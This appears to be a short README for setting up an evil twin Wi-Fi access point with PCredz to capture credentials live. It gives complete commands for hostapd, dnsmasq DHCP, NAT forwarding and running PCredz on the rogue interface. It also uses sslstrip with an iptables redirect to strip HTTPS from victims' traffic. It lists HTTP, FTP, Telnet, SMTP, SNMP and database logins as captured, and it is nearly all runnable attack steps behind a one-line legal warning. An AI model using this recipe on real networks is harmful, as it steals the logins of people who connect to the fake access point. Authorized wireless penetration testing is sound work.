# Evil Twin + PCredz - Live Credential Capture

## Quick Start

```bash
# Run PCredz on your Evil Twin interface
sudo python3 -m pcredz -i wlan0 -v --json --csv
```

## Complete Setup

### 1. Evil Twin AP
```bash
# hostapd config
sudo hostapd /tmp/hostapd.conf &

# Network
sudo ip addr add 192.168.100.1/24 dev wlan0
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# DHCP
sudo dnsmasq --interface=wlan0 --dhcp-range=192.168.100.10,192.168.100.100 &
```

### 2. Live Capture
```bash
sudo python3 -m pcredz -i wlan0 -v --json --csv
```

## What Gets Captured

✅ HTTP, FTP, Telnet, SMTP, SNMP, Databases
⚠️ HTTPS requires MITM proxy (sslstrip/mitmproxy)

## For HTTPS: Use sslstrip
```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000
sudo sslstrip -l 10000 &
sudo python3 -m pcredz -i wlan0 -v
```

⚠️ **LEGAL WARNING**: Authorized testing only!
